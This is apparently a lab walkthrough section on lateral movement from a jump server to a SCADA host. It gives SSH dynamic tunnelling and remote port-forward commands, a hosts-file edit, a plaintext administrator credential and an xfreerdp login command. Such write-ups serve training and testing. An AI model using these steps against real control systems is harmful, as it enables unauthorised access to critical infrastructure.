# Lateral Movement 3 - Jump-Server to SCADA

- [Lateral Movement 3 - Jump-Server to SCADA](#lateral-movement-3---jump-server-to-scada)
  - [SSH Tunnel](#ssh-tunnel)
  - [Access the SCADA Server](#access-the-scada-server)

----

## SSH Tunnel

First establish Dynamic SSH tunnel:

```
proxychains ssh -D 9050 jump-admin@10.1.1.4
```

<br/>

Add `10.2.1.1 scada-host.scada.local` in the attacker hosts file:

![picture 43](images/d7094e61a570427a72c40d5d37aea2f0305e741799521d72f5af1ebfd0352286.png)  

<br/>

Try to access the server rdweb:

```
https://scada-host.scada.local/RDWeb/
```

![picture 44](images/6eae78075a6847d59e203206b6c99c0923f42dc2b9d5aec4c0a0c94c22eece13.png)  

<br/>

Use the obtained credential to login:

`Administrator` / `SCADAAdmin!@#$%`

![picture 45](images/253436bd19fb8903471e6bebd5353d91547a51b9e9baf280cca05a857e75dde1.png)  

<br/>

## Access the SCADA Server

Since RD Web Access is enable, do a remote port forward:

```
ssh -R 443:10.2.1.1:443 root@192.168.100.11
```

![picture 46](images/4bbed698827e52c040e91af82f9c6dd6277bd834fb76806a6c1bfa187163b97f.png)  

<br/>

On the attacker host, modify `/etc/hosts`:

```
nano /etc/hosts
```

![picture 47](images/1b0fa4ce6aadb0f0a3cec303eedf4a564ecc17b33477fdc67e3fb782369a163e.png)  

<br/>

Then use `xfreerdp` to access:

```
xfreerdp /d:scada /u:Administrator /p:'SCADAAdmin!@#$%' /v:scada-host.scada.local /g:scada-host.scada.local
```

![picture 48](images/8b4d69fc702bb637fda089ef298df317276846ebe07623e3d941e855c1f65fc2.png)  

